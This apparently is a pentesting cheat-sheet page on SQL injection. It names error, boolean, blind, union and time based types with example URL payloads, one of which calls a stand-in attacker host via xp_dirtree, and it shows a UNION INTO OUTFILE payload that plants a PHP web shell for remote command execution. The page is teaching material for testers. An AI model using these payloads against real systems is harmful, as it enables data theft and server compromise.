# SQLi

{% hint style="info" %}
SQL Injection (SQLi) is a type of an **injection attack** that makes it possible to execute malicious SQL statements. These statements control a database server behind a web application. Attackers can use SQL Injection vulnerabilities to bypass application security measures.
{% endhint %}

## Payloads

{% embed url="https://github.com/payloadbox/sql-injection-payload-list" %}
Payload list
{% endembed %}

## Types

### Error based

Forcing the database to perform some operation in which the result will be an **error**. Then try to extract some data from the database and show it in the error message.&#x20;

#### Example

```
https://www.example.beaglesecurity.com/gallery.php?id=6'
```

### Boolean based

Relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a **TRUE** or **FALSE** result.&#x20;

#### Example&#x20;

```
https://www.example.beaglesecurity.com/gallery.php?id=6' AND 1=1 --+
```

### Blind based

Sending **payloads**, observing the web application’s response and the resulting behavior of the database server. **Check payloads**.

#### Example &#x20;

```
https://example.com/products.aspx?id=1;EXEC master..xp_dirtree '\\test.attacker.com\' --
```

### Union based&#x20;

UNION-based attacks allow the tester to easily **extract information from the database**. Because the UNION operator can only be used if both queries have the exact same structure, the attacker must craft a SELECT statement similar to the original query.

#### Example

```
https://example.com/products.aspx?id=1' UNION SELECT passwords from users;
```

### Time based

Forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is **TRUE** or **FALSE**.&#x20;

#### Example&#x20;

```
https://example.com/products.aspx?id=1' and if(substring(user(),2,1)='a',SLEEP(5),1)--
```

## SQLi to RCE

### Using XAMP

{% embed url="https://kayran.io/blog/web-vulnerabilities/sqli-to-rce" %}

#### Payload

```php
# Inject cmd parameter
' union select 1,<php_payload>,3,4 into outfile <path> --
' union select 1,'<?php system($_GET["cmd"]); ?>',3,4 intooutfile 'C:\\xampp\\htdocs\\rce.php' --

# Reverse Shell created. Access from outside :
<host>/rce.php?cmd=<command>

# Test :
127.0.0.1/rce.php?cmd=time
# Result : The current time is: 16:22:25.20 Enter the new time: 3 4
```
